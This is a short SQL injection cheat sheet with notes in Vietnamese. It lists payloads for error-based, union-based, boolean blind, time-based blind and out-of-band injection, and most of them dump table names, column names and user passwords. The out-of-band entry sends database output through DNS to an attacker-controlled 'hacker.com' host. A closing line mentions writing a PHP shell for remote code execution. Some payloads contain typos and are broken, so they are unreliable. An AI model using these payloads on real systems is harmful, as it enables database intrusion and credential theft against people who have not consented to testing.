# SQL-Injection
- Error-base SQLi:
    # Nhập '  để hiển thị thông báo lỗi 
    # ' or 1=1-- 
    # ' and updatexml(null,concat(0x0a,database()),null)-- 
    # ' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database()))-- 
    # ' and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_name=''))-- 
    # ' adn updatexml(null,concat(0x0a,(select (id,'-',password) from ''))--   
- Union-based SQLi:
    # ' order by 1,2,3... -- 
    # ' uinon select 1,2,3,4,5...--
    # ' union select 1,2,group_concat(table_name), from information_schema.tables where table_schema=database(),..-- 
    # ' union select column_name from information_schema.columns where table_name='',..-- 
    # ' union select concat(id,email,password) from table_name ...

- Blind-Boolean-based:
    # ' or length(database())=$1$--  / ' or 1=1 and database() =
    # ' or substring(database(),$1$,1)='a'-- 
    # ' or substring((select table_name from information_schema.tables where table_schema='database' limit 0,1), $1$,1)='$a$'-- 
    # ' or substring((select column_name from information_schema.tables where table_name='' limit 0,1), $1$,1)='$a$'--
    # ' or substring((select  from table_name limit 0,1), $1$,1)='$a$'--
    
    # admin'+and+(select+length(password)+from+users)=11 — &password=pass
    # admin' and substr((select password from users where (username=’user1')),1,1)=’§subpass§’ — &password=password
- Time-based Blind: 

    # 1' and if(length(database())=1,sleep($1$),null)--  : tìm số ký tự trong database
    # 1' and if(substring(database(),$1$,1)='',sleep(),null)-- : tìm lần lượt các ký tự
    # 1' and if(substring(select table_name from information_schema.tables where table.schema='database' limit 0,1),$1$,1)='$a$',sleep(5),null)-- 

- Out-of-band:  1’;select load_file(concat('\\\\',version(),'.hacker.com\\s.txt'));

select version() into outfile('\\burp-collab\a')
Hai lệnh trên nối đầu ra của các lệnh version() hoặc database() vào truy vấn độ phân giải DNS cho miền “hacker.com”.
Hình ảnh bên dưới cho thấy phiên bản và tên của cơ sở dữ liệu đã được thêm vào thông tin DNS cho miền độc hại như thế nào. Kẻ tấn công kiểm soát máy chủ có thể đọc thông tin từ các tệp nhật ký.

mount.cifs //Win10-AP/Shared /home/kali/Desktop/FileSharing -o user=kali
Rce tương tác với hệ thông, thực thi shell, ghi shell php = cách giống upload file để injection
